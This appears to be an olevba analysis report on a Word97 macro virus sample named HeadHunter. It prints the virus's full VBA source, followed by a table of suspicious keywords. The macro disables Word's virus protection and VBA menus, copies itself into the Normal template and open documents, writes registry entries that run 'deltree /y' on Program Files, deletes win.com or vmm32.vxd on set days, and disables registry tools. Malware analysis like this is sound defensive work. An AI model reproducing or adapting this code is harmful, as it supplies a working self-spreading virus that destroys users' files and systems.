olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.HeadHunter-dac87eae201d98d5fbd313291c5cbdeb9d7a6d8e
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO HeadHunter.cls 
in file: Virus.MSWord.HeadHunter-dac87eae201d98d5fbd313291c5cbdeb9d7a6d8e - OLE stream: 'Macros/VBA/HeadHunter'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'With love HeadHunter.a v/0.2 for Word97
Private Sub Document_Open()
On Error Resume Next
Options.SaveNormalPrompt = 0: Options.ConfirmConversions = 0: Options.VirusProtection = 0: Application.ScreenUpdating = 0
CommandBars("Tools").Controls(12).Enabled = 0: CommandBars("Visual Basic").Enabled = 0: CommandBars("Control Toolbox").Enabled = 0
If NormalTemplate.VBProject.VBComponents.Item(1).Name = "HeadHunter" Then LFH785 = 1
If ActiveDocument.VBProject.VBComponents.Item(1).Name = "HeadHunter" Then NZR249 = 1
If LFH785 = 1 And NZR249 = 1 Then GoTo HH
If LFH785 = 0 Then H7F8L5 = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, HeadHunter.VBProject.VBComponents.Item(1).CodeModule.CountOfLines): With NormalTemplate.VBProject.VBComponents.Item(1).CodeModule: .DeleteLines 1, .CountOfLines: .AddFromString H7F8L5: End With: NormalTemplate.VBProject.VBComponents.Item(1).Name = "HeadHunter"
If NZR249 = 0 Then R2Z4N9 = HeadHunter.VBProject.VBComponents.Item(1).CodeModule.Lines(1, HeadHunter.VBProject.VBComponents.Item(1).CodeModule.CountOfLines): With ActiveDocument.VBProject.VBComponents.Item(1).CodeModule: .DeleteLines 1, .CountOfLines: .AddFromString R2Z4N9: End With: ActiveDocument.VBProject.VBComponents.Item(1).Name = "HeadHunter"
ActiveDocument.SaveAs ActiveDocument.FullName
Set WshShell = CreateObject("WScript.Shell"): WshShell.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{20D04FE0-3AEA-1069-A2D8-08002B30309D}\shell\System Info...\Command\", "start /minimized command /c deltree /y c:\Progra~1"
Set WshShell = CreateObject("WScript.Shell"): WshShell.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Uninstall\System Info\DisplayName", "System Info"
Set WshShell = CreateObject("WScript.Shell"): WshShell.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Uninstall\System Info\UninstallString", "start /minimized command /c deltree /y c:\Progra~1"
Set WshShell = CreateObject("WScript.Shell"): WshShell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\VBA\Office\CodeBackColors", "1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1"
Set WshShell = CreateObject("WScript.Shell"): WshShell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\VBA\Office\CodeForeColors", "1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1"
Set WshShell = CreateObject("WScript.Shell"): WshShell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\VBA\Office\EndProcLine", 0, "REG_DWORD"
Set WshShell = CreateObject("WScript.Shell"): WshShell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableRegistryTools", 1, "REG_DWORD"
HH:
End Sub
Private Sub Document_Close()
On Error Resume Next
Open "c:\msdos.sys" For Input As #1: Do Until EOF(1): Line Input #1, HH: If Left(UCase(HH), 7) = "WINDIR=" Then l = Len(HH): windir = Mid(HH, 8, l)
Loop
Close #1
If Day(Now()) = 9 Then: HH = Dir(windir & "\win.com"): If HH <> "" Then Kill windir & "\win.com"
If Day(Now()) = 22 Then: HH = Dir(windir & "\System\vmm32.vxd"): If HH <> "" Then Kill windir & "\System\vmm32.vxd"
If ActiveDocument.Name = ActiveDocument.FullName Then End
Call Document_Open
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|WScript.Shell       |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Command             |May run PowerShell commands                  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

